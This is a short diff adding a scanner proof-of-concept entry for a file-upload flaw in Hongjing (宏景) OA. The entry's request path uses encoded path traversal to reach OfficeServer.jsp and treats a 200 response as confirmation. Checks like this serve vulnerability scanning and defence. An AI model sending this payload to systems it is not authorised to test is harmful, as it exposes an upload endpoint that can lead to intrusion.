@@ -1,0 +1,3 @@
+name: "宏景OA文件上传"
+poc: "/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp"
+status_code: 200
